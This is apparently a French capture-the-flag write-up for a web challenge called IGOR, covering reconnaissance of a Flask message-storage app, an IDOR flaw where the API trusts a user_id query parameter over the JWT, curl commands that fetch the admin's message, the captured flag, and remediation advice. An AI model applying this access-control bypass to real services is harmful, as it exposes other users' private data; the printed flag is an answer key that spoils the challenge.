# IGOR (2025) — Web

**Flag :** `OPENNC{N07_1nt3nd3D_f0R_yOuR_3ye5...}`

## Énoncé

Une plateforme de stockage temporaire de messages (« PMS — Private Message
Storage »). L'agent IGOR, en charge du référencement des objets, a « oublié
quelques principes de base du contrôle d'accès ». Challenge à instance Docker
(ctfd-whale), auteur : Yoan.

## Reconnaissance

L'appli Flask (Werkzeug 3.1.3) redirige tout vers `/login`. Le formulaire de
login poste deux champs `login` / `password` :

```html
<form method="POST">
  <input name="login" placeholder="Username" required>
  <input name="password" ... type="password" required>
</form>
```

N'importe quel couple identifiant/mot de passe est accepté **sauf `admin`** (qui
renvoie un token à `user_id: null`). La session est un **JWT HS256** posé en
cookie `token` :

```
eyJ...  ->  {"user_id": "igor", "iat": 1790670681}
```

La page authentifiée charge le message via `/static/main.js` :

```js
function loadMyMessage() {
    fetch('/api/message?user_id=' + encodeURIComponent(getUserID(decodeJwtPayload(getCookie('token')))))
      .then(resp => resp.json())
      .then(data => { ... data.content ... });
}
```

## Faille — IDOR

Le client lit son propre `user_id` **depuis le JWT** puis le passe en
**paramètre de query** à `/api/message`. Côté serveur, le message est retourné
en fonction du `user_id` de la query, **sans jamais vérifier qu'il correspond au
JWT présenté**. C'est un IDOR direct : il suffit de demander le message d'un
autre utilisateur. Le message secret est celui de `admin` — le compte qu'on ne
peut justement pas obtenir au login.

## Exploitation

```bash
B=http://legacychalls.hackagou.nc:PORT
# Se connecter en tant qu'utilisateur quelconque
tok=$(curl -s -i -X POST "$B/login" --data "login=igor&password=x" \
      | grep -oP 'token=\K[^;]+')

# IDOR : réclamer le message de 'admin' (attention au slash final -> 308)
curl -sL -b "token=$tok" "$B/api/message/?user_id=admin"
# {"content":"OPENNC{N07_1nt3nd3D_f0R_yOuR_3ye5...}","user_id":"admin"}
```

## Remédiation

Ne jamais dériver l'identité d'une ressource d'un paramètre contrôlé par le
client : le serveur doit résoudre `user_id` **depuis le JWT vérifié**
(`get_current_user()`), pas depuis la query-string.
